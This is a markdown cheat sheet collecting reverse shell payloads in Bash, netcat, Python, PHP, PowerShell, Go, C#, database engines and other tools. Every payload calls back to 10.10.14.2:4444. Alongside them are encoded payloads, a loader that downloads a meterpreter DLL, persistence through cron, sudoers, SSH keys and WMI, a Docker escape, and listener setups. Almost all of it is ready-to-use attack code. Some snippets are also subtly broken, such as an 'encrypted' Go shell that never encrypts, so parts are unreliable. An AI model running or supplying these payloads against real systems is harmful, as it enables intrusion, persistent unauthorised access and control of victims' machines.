
# Reverse Shell Collection

## Table of Contents
- [Bash Reverse Shells](#bash-reverse-shells)
- [Netcat Reverse Shells](#netcat-reverse-shells)
- [Python Reverse Shells](#python-reverse-shells)
- [PHP Reverse Shells](#php-reverse-shells)
- [Perl Reverse Shells](#perl-reverse-shells)
- [Ruby Reverse Shells](#ruby-reverse-shells)
- [Java Reverse Shells](#java-reverse-shells)
- [Golang Reverse Shells](#golang-reverse-shells)
- [PowerShell Reverse Shells](#powershell-reverse-shells)
- [Node.js Reverse Shells](#nodejs-reverse-shells)
- [Lua Reverse Shells](#lua-reverse-shells)
- [Awk Reverse Shells](#awk-reverse-shells)
- [Telnet Reverse Shells](#telnet-reverse-shells)
- [Socat Reverse Shells](#socat-reverse-shells)
- [OpenSSL Reverse Shells](#openssl-reverse-shells)
- [Ncat Reverse Shells](#ncat-reverse-shells)
- [Database Reverse Shells](#database-reverse-shells)
- [Advanced PHP Reverse Shell](#advanced-php-reverse-shell)
- [Advanced Shells and Persistence](#advanced-shells-and-persistence)
- [Shell Stabilization](#shell-stabilization)
- [Advanced Stabilization](#advanced-stabilization)
- [Listener Setup](#listener-setup)
- [Advanced Listener Setups](#advanced-listener-setups)
- [Common Issues and Fixes](#common-issues-and-fixes)
- [Quick Reference](#quick-reference)
---

## Bash Reverse Shells

### Standard Bash
```bash
bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
```

### Bash with Exec
```bash
exec 5<>/dev/tcp/10.10.14.2/4444;cat <&5|while read line;do $line 2>&5 >&5;done
```

### Bash with File Descriptors
```bash
0<&196;exec 196<>/dev/tcp/10.10.14.2/4444; sh <&196 >&196 2>&196
```

### Bash without /dev/tcp
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f
```

### Bash with Timeout
```bash
timeout 60 bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
```

### Bash with No HUP
```bash
nohup bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' &
```

### Bash with Encryption (AES)
```bash
echo 'U2FsdGVkX1/...' | openssl enc -aes-256-cbc -a -d -salt -pass pass:secret | bash
```

### IPv6 Bash Shell
```bash
bash -i >& /dev/tcp/[2001:db8::1]/4444 0>&1
```

---

## Netcat Reverse Shells

### Netcat with -e
```bash
nc -e /bin/sh 10.10.14.2 4444
```

### Netcat without -e
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f
```

### Netcat with -c
```bash
nc -c /bin/sh 10.10.14.2 4444
```

### Netcat UDP
```bash
nc -u 10.10.14.2 4444 < /bin/sh
```

### Netcat Windows
```cmd
nc -e cmd.exe 10.10.14.2 4444
```

### Named Pipe (FIFO) with Netcat
```bash
while true; do
    rm -f /tmp/f; mkfifo /tmp/f
    cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.10.14.2 4444 > /tmp/f
done &
```

---

## Python Reverse Shells

### Python Standard
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python 3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python with PTY
```python
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Python Encrypted
```python
python -c 'import socket,subprocess,os,ssl;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s=ssl.wrap_socket(s);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python Multi-Platform
```python
python -c "exec(\"import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('10.10.14.2', 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(['/bin/sh', '-i'])\")"
```

---

## PHP Reverse Shells

### PHP Standard
```php
php -r '$sock=fsockopen("10.10.14.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP with System
```php
php -r '$s=fsockopen("10.10.14.2",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP with Proc_Open
```php
php -r '$s=fsockopen("10.10.14.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s),$pipes);'
```

### PHP Short Tag
```php
<?php $s=fsockopen("10.10.14.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");?>
```

### PHP Base64 Encoded
```php
<?php eval(base64_decode('JHM9ZnNvY2tvcGVuKCIxMC4xMC4xNC4yIiw0NDQ0KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOw=='));?>
```

### PHP URL Encoded
```php
<?php $s=fsockopen("10.10.14.2",4444);proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s),$p);?>
```

---

## Perl Reverse Shells

### Perl Standard
```perl
perl -e 'use Socket;$i="10.10.14.2";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Perl with System
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.2:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Perl Windows
```perl
perl -e 'use Socket;$i="10.10.14.2";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("cmd.exe");};'
```

---

## Ruby Reverse Shells

### Ruby Standard
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.2",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Ruby with System
```ruby
ruby -rsocket -e 's=TCPSocket.new("10.10.14.2",4444);loop do;cmd=s.gets;IO.popen(cmd,"r"){|io|s.print io.read};end'
```

### Ruby Windows
```ruby
ruby -rsocket -e 'c=TCPSocket.new("10.10.14.2",4444);while cmd=c.gets;IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Java Reverse Shells

### Java Standard
```java
public class Shell { public static void main(String[] args) throws Exception { String[] cmd = {"/bin/sh","-c","exec 5<>/dev/tcp/10.10.14.2/4444;cat <&5|while read line;do $line 2>&5 >&5;done"}; Runtime.getRuntime().exec(cmd); } }
```

### Java with Socket
```java
public class Shell { public static void main(String[] args) throws Exception { Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start(); Socket s = new Socket("10.10.14.2",4444); new Thread(() -> { try { byte[] b = new byte[1024]; int l; while ((l = p.getInputStream().read(b)) != -1) s.getOutputStream().write(b,0,l); } catch(Exception e) {} }).start(); new Thread(() -> { try { byte[] b = new byte[1024]; int l; while ((l = s.getInputStream().read(b)) != -1) p.getOutputStream().write(b,0,l); } catch(Exception e) {} }).start(); } }
```

---

## Golang Reverse Shells

### Go Standard
```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.2:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
```

### Go with PTY
```go
echo 'package main;import"os/exec";import"syscall";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.2:4444");cmd:=exec.Command("/bin/sh");cmd.SysProcAttr=&syscall.SysProcAttr{Setctty:true,Setsid:true};cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
```

### Golang Encrypted Reverse Shell
```go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "io"
    "net"
    "os/exec"
)

func main() {
    key := []byte("32-byte-key-for-aes-256-encryption")
    conn, _ := net.Dial("tcp", "10.10.14.2:4444")
    defer conn.Close()
    
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(rand.Reader, nonce)
    
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
```

---

## PowerShell Reverse Shells

### PowerShell Standard
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

### PowerShell One-Liner
```powershell
powershell -e JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADQALgAyACcALAA0ADQANAA0ACkAOwAkAHMAIAA9ACAAJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgA9ACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiAHQALAAwACwAJABzAGIAdAAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA==
```

### PowerShell Base64 Encoded
```powershell
$text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$encoded = [System.Convert]::ToBase64String($bytes)
```

### PowerShell Reflective Injection
```powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.2/meterpreter.dll')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] ('', '10.10.14.2', '4444')))
```

### Windows WMI Reverse Shell (Persistence)
```powershell
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.Name = "ShellPersistence"
$filter.EventNamespace = 'root\cimv2'
$result = $filter.Put()

$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = 'ShellConsumer'
$consumer.CommandLineTemplate = "powershell -e <base64_encoded_shell>"
$consumer.Put()

$bind = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$bind.Filter = $result.Path
$bind.Consumer = $consumer.Path
$bind.Put()
```

---

## Node.js Reverse Shells

### Node Standard
```javascript
node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]}).on("error",function(e){}).connect({port:4444,host:"10.10.14.2"});'
```

### Node with Net
```javascript
node -e 'var net=require("net");var cp=require("child_process");var sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4444,"10.10.14.2",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'
```

### Node with HTTPS
```javascript
node -e 'var https=require("https");var cp=require("child_process");var sh=cp.spawn("/bin/sh",[]);var client=https.get("https://10.10.14.2:4444",function(res){res.pipe(sh.stdin);sh.stdout.pipe(res);sh.stderr.pipe(res);});'
```

---

## Lua Reverse Shells

### Lua Standard
```lua
lua -e 'local s=require("socket");local t=s.tcp();t:connect("10.10.14.2",4444);while true do local cmd=t:receive();local f=io.popen(cmd);local output=f:read("*all");t:send(output);end'
```

### Lua with PTY
```lua
lua -e 'local p=io.popen("/bin/sh -i");local s=require("socket");local t=s.tcp();t:connect("10.10.14.2",4444);while true do t:send(p:read("*line"));end'
```

---

## Awk Reverse Shells

### Awk Standard
```awk
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.2/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Awk with Network
```bash
awk 'BEGIN{print "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" | "/bin/sh"}'
```

---

## Telnet Reverse Shells

### Telnet Dual Connection
```bash
telnet 10.10.14.2 4444 | /bin/sh | telnet 10.10.14.2 5555
```

### Telnet with FIFO
```bash
mknod /tmp/backpipe p; telnet 10.10.14.2 4444 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
```

---

## Socat Reverse Shells

### Socat Standard
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.2:4444
```

### Socat with TTY
```bash
socat file:`tty`,raw,echo=0 tcp:10.10.14.2:4444
```

### Socat Windows
```cmd
socat exec:'cmd.exe',pty,stderr,setsid,sigint,sane tcp:10.10.14.2:4444
```

### Socat Encrypted
```bash
socat OPENSSL:10.10.14.2:4444,verify=0 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

### SCTP Reverse Shell
```bash
# Listener
socat SCTP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Client
socat EXEC:/bin/bash SCTP:10.10.14.2:4444
```

---

## OpenSSL Reverse Shells

### OpenSSL Listener Setup
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

### OpenSSL Victim
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.2:4444 > /tmp/s; rm /tmp/s
```

### OpenSSL with No Cert Check
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.2:4444 -no_verify > /tmp/s; rm /tmp/s
```

---

## Ncat Reverse Shells

### Ncat Standard
```bash
ncat --exec "/bin/bash" --allow 10.10.14.2 -vnl 4444 --keep-open
```

### Ncat with SSL
```bash
ncat --exec "/bin/bash" --ssl --allow 10.10.14.2 -vnl 4444 --keep-open
```

### Ncat Windows
```cmd
ncat --exec cmd.exe --allow 10.10.14.2 -vnl 4444 --keep-open
```

---

## Database Reverse Shells

### MySQL Reverse Shell
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('bash -i >& /dev/tcp/10.10.14.2/4444 0>&1');
```

### PostgreSQL Reverse Shell
```sql
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1';
SELECT pg_execute_server_program('bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"');
```

### MongoDB Reverse Shell
```javascript
db.eval("var exec = require('child_process').exec; exec('bash -i >& /dev/tcp/10.10.14.2/4444 0>&1');")
```

### Redis Reverse Shell
```bash
redis-cli set shell "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"
redis-cli config set dir /var/spool/cron/
redis-cli config set dbfilename root
redis-cli save
```

### Advanced PHP-FPM Reverse Shell
```php
<?php
$sock = fsockopen("unix:///var/run/php/php7.4-fpm.sock", -1, $errno, $errstr, 30);
fwrite($sock, "SCRIPT_FILENAME=/var/www/html/shell.php\x00REQUEST_METHOD=GET\x00");
fwrite($sock, "<?php system('bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'); ?>");
fclose($sock);
?>
```

---

## Advanced PHP Reverse Shell

### Fully Featured PHP Shell
```php
<?php
set_time_limit(0);
$VERSION = "1.0";
$ip = '10.10.14.2';
$port = 4444;
$chunk_size = 1400;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) die("ERROR: Can't fork");
    if ($pid) exit(0);
    if (posix_setsid() == -1) die("Error: Can't setsid()");
    $daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) die("$errstr ($errno)");

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) die("ERROR: Can't spawn shell");

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    if (feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```

---

## Advanced Shells & Persistence

### Meterpreter Reverse Shells
```bash
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf > shell.elf

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe > shell.exe

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw > shell.php
```

### C# Reverse Shell (Windows)
```csharp
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class Shell {
    static void Main() {
        TcpClient client = new TcpClient("10.10.14.2", 4444);
        StreamReader reader = new StreamReader(client.GetStream());
        StreamWriter writer = new StreamWriter(client.GetStream());
        
        while (true) {
            string cmd = reader.ReadLine();
            if (cmd == "exit") break;
            
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            
            writer.WriteLine(process.StandardOutput.ReadToEnd());
            writer.Flush();
        }
        client.Close();
    }
}
```

### Rust Reverse Shell
```rust
use std::process::Command;
use std::os::unix::io::AsRawFd;
use std::net::TcpStream;

fn main() {
    let stream = TcpStream::connect("10.10.14.2:4444").unwrap();
    let fd = stream.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(fd)
        .stdout(fd)
        .stderr(fd)
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

### Cross-Platform .NET Core Shell
```csharp
using System;
using System.Net.Sockets;
using System.Diagnostics;

class Shell {
    static void Main() {
        using(var client = new TcpClient("10.10.14.2", 4444))
        using(var stream = client.GetStream()) {
            while(true) {
                byte[] buffer = new byte[1024];
                int read = stream.Read(buffer, 0, buffer.Length);
                string cmd = System.Text.Encoding.UTF8.GetString(buffer, 0, read);
                
                var process = new Process {
                    StartInfo = new ProcessStartInfo {
                        FileName = "/bin/bash",
                        Arguments = "-c \"" + cmd + "\"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    }
                };
                process.Start();
                string output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
                byte[] response = System.Text.Encoding.UTF8.GetBytes(output);
                stream.Write(response, 0, response.Length);
            }
        }
    }
}
```

### Advanced Persistence Techniques

#### Cron Persistence
```bash
echo '*/1 * * * * root nc -e /bin/sh 10.10.14.2 4444' >> /etc/crontab
```

#### Sudo Persistence
```bash
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/persistence
```

#### SSH Key Persistence
```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys
```

#### Screen/TMUX Persistence
```bash
screen -dmS shell bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
tmux new-session -d -s shell 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
```

### Fileless Memory Shell
```bash
# memfd_create (Linux 3.17+)
fd=$(python3 -c 'import ctypes, os; f=ctypes.CDLL(None).memfd_create(b"",1); os.write(f,b"#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.2/4444 0>&1\n"); os.fchmod(f,0o777); os.execl(f"/proc/self/fd/{f}","")')
```

### SSH Reverse Tunnel
```bash
ssh -R 4444:localhost:22 -N -f user@10.10.14.2
ssh -o "ProxyCommand=nc -X connect -x 10.10.14.2:4444 %h %p" user@target
```

### Docker Container Escape
```bash
docker run -it --privileged --pid=host --net=host --ipc=host --uts=host --cap-add=ALL ubuntu bash
nsenter -t 1 -m -u -i -n -p /bin/bash
```

### WebSocket Reverse Shell
```javascript
const WebSocket = require('ws');
const cp = require('child_process');
const ws = new WebSocket('ws://10.10.14.2:4444');
ws.on('message', (data) => {
  const sh = cp.spawn('/bin/bash', []);
  sh.stdout.on('data', (out) => ws.send(out.toString()));
  sh.stderr.on('data', (err) => ws.send(err.toString()));
  sh.stdin.write(data.toString());
});
```

### Telegram Bot Shell
```python
import telebot
import subprocess

bot = telebot.TeleBot('YOUR_BOT_TOKEN')
CHAT_ID = 'YOUR_CHAT_ID'

@bot.message_handler(commands=['cmd'])
def handle_command(message):
    cmd = message.text.replace('/cmd ', '')
    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    bot.send_message(CHAT_ID, output.decode())

bot.polling()
```

---

## Shell Stabilization

### Python PTY Method
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Script Method
```bash
script /dev/null -c bash
```

### Perl Method
```bash
perl -e 'exec "/bin/bash";'
```

### Ruby Method
```bash
ruby -e 'exec "/bin/bash";'
```

### Expect Method
```bash
expect -c 'spawn bash; interact;'
```

### Full TTY Upgrade Steps

#### Step 1: Spawn PTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### Step 2: Background Shell
```bash
Ctrl + Z
```

#### Step 3: Disable Echo and Foreground
```bash
stty raw -echo; fg
```

#### Step 4: Reset Terminal
```bash
reset
```

#### Step 5: Export Terminal Variables
```bash
export TERM=xterm
export SHELL=/bin/bash
export PS1='\u@\h:\w\$ '
```

#### Step 6: Set Window Size
```bash
stty rows 50 cols 100
```

### Complete TTY Upgrade One-Liner
```bash
python -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg && export TERM=xterm && export SHELL=/bin/bash && export PS1='\u@\h:\w\$ ' && stty rows 50 cols 100
```

---

## Advanced Stabilization

### Auto-stabilization Script
```bash
#!/bin/bash
if [ -n "$1" ]; then
    python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
    python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
    script /dev/null -c bash 2>/dev/null || \
    expect -c 'spawn bash; interact' 2>/dev/null
    
    stty raw -echo
    fg
    export TERM=xterm
    export SHELL=/bin/bash
    export PS1='\u@\h:\w\$ '
    stty rows $LINES cols $COLUMNS
fi
```

### Tab Completion Fix
```bash
bind 'set completion-ignore-case on'
bind 'set show-all-if-ambiguous on'
bind 'TAB:complete'
```

### History Fix
```bash
export HISTFILE=~/.bash_history
export HISTSIZE=1000
export HISTFILESIZE=2000
history -r
```

### Color Prompt Fix
```bash
export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
```

### Job Control Fix
```bash
set -m
```

### Command Not Found Handler
```bash
apt-get install command-not-found || yum install command-not-found
```

### Shell Status Check
```bash
# Check if interactive
echo $0

# Check TTY
tty

# Check terminal type
echo $TERM

# Get current size
stty size
```

---

## Listener Setup

### Netcat Listener
```bash
nc -lvnp 4444
```

### Netcat Listener with Keep-Alive
```bash
nc -lvnp 4444 -k
```

### Socat Listener
```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

### Socat Listener with Reuse
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

### Ncat Listener
```bash
ncat -lvnp 4444
```

### Ncat with SSL
```bash
ncat -lvnp 4444 --ssl
```

### Python Listener
```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();subprocess.call(["/bin/sh","-i"],stdin=conn.fileno(),stdout=conn.fileno(),stderr=conn.fileno())'
```

### Python Multi-Client Listener
```python
python -c 'import socket,subprocess,threading;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(5);def h(c):subprocess.call(["/bin/sh","-i"],stdin=c.fileno(),stdout=c.fileno(),stderr=c.fileno());while 1:c,a=s.accept();threading.Thread(target=h,args=(c,)).start()'
```

### Ruby Listener
```ruby
ruby -rsocket -e 's=TCPServer.open(4444);loop{client=s.accept;client.puts("Shell");client.puts("exit")}'
```

### PHP Listener
```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4444);socket_listen($s,1);$c=socket_accept($s);while(1){$a=socket_read($c,2048);if(!$a)break;$b=shell_exec($a);socket_write($c,$b);}socket_close($c);socket_close($s);'
```

### OpenSSL Listener
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

---

## Advanced Listener Setups

### Full TTY Listener with Socat
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

### Listener with Logging
```bash
nc -lvnp 4444 | tee -a shell.log
```

### Listener with Timestamps
```bash
nc -lvnp 4444 2>&1 | while read line; do echo "[$(date)] $line"; done
```

### Listener with Multiple Connections
```bash
while true; do nc -lvnp 4444; done
```

### Listener with Automatic Stabilization
```bash
nc -lvnp 4444 && python -c 'import pty; pty.spawn("/bin/bash")'
```

### Listener with Web Interface
```python
from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/shell', methods=['POST'])
def shell():
    cmd = request.json.get('cmd', '')
    if cmd:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return jsonify({'output': output.decode()})
    return jsonify({'error': 'No command provided'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4444, ssl_context='adhoc')
```

### Listener with Multiple Protocols
```python
import socket
import threading
import ssl
import subprocess

def tcp_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4444))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_connection, args=(conn, addr)).start()

def handle_connection(conn, addr):
    print(f"Connection from {addr}")
    with conn:
        while True:
            data = conn.recv(1024)
            if not data: break
            output = subprocess.check_output(data.decode(), shell=True, stderr=subprocess.STDOUT)
            conn.sendall(output)

if __name__ == "__main__":
    tcp_listener()
```

### Listener with Persistence
```bash
#!/bin/bash
while true; do
    nc -lvnp 4444
    sleep 5
done
```

### Listener with File Transfer
```bash
# Send
nc -lvnp 4444 < file.zip

# Receive
